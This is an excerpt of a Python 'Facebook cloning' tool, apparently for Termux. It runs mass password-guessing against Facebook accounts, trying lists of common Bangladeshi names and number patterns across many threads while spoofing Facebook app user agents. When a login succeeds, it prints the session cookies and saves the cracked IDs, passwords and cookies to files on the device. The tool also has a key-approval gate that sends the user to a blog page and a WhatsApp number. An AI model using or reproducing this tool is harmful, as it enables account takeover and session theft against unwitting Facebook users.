...
██   ████  ██████     ██          ██   ██   \x1b[38;5;49m [0.0]                                                                                            
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [✵]FACEBOOK    : 𝙺𝚑 𝙼𝚞𝚑𝚊𝚖𝚖𝚊𝚍 𝙰𝚕𝚒 𝙷𝚎𝚖𝚎𝚕
 [✵]TOOL NAME   : 𝙽𝙾𝚃-𝚇 [𝙵𝙸𝙻𝙴+𝚁𝙽𝙳𝙼]
 [✵]TOOL OWNER  : 𝙷𝙴𝙼𝙴𝙻-𝟼𝚃𝟿
 [✵]GITHUB      : https://github.com/HemelxMeme
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;49m""")
...
def Main():
	os.system('clear')
	print(logo)
	print("\33[1;92m[\033[1;37m01\33[1;92m]START RANDOM CLONING")
	print("[\033[1;37m02\33[1;92m]START FILE CLONING")
	...
	if opt in ["B","2"]:
		file()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100077511667396');time.sleep(1)
		fb()
	if opt in ["0","0"]:
		exit()
...
def fuck():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','506070','203040','113355','sumaiya','nusrat','shahin','bangla','love you','alamin','jesmin','sadia']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mHEMEL-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [HEMEL-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;97m=[Cookie]=\033[;0m\033[1;91m\033[1;92m"'+coki)
                oks.append(cid)
                open('/sdcard/HEMEL-RNDM-OK', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                cpu.append(cid)
                print('\033[1;31m[HEMEL-CP] \033[1;31m'+cid+' \033[1;31m|\033[1;31m '+ps)
                open('/sdcard/HEMEL-RNDM-CP', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def main_menu():
    ...
    print(logo)
    line()
    print(f"{oo(1)}\x1b[38;5;6mFile Cloning ")
    line()
    print(f"{oo(0)}\x1b[38;5;196mExit")
    line()
    cp =input('\33[1;37m[?] \33[38;5;46mChoice : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()     
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write(f'\r {R}[{G}HEMEL-XD{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}OK {len(oku)} {W}• {R}CP {len(cpu)}\r')
...
#---------ua-----------#
              ...
              heads="Davik/2.1.0 (Linux; U; Android 7; Oppo rano a96s Build/TP1A.311163.872) FBAN/MobileAdsManagerAndroid;FBAV/154.0.0.46.44;FBBV/566078180;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/th_TH;FBMF/T-Mobile;FBBD/T-Mobile;FBDV/Oppo rano a96s;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]" #Put Your user Agent Here
    ...
    "api_key": "882a8490361da98702bf97a021ddc14d",
              ...
              if "session_key" in response:
                 ...
                 print('\033[1;32m[HEMEL-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)

                 print("\033[1;91m\033[1;41m\033[1;97m=[Cookie]=\033[;0m\033[1;91m\033[1;92m",cookie)

                 open('/sdcard/HEMEL-FILE-OK.txt','a').write(f'{acc}|{pswd}|\n')
                 open('/sdcard/HEMEL-FILE-COOKIE.txt','a').write(f'{cookie}\n')
                ...
                #print('\033[1;31m[HEMEL-CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)

                open('/sdcard/HEMEL-FILE-CP.txt','a').write(f'{acc}|{pswd}\n')
...
def approval():
	...
	key = "6".join(uuid)
	ress=httpx.get("https://get-giveaway-earning-offer.blogspot.com/2023/10/aproval.html").text
	if key in ress:
		Main()
	else:
		...
		print("Your key : \33[1;91m"+frist+key+last)
		line()
		name = input("\33[38;5;49mYOUR NAME :")
		os.system("xdg-open https://wa.me/+8801768037009")
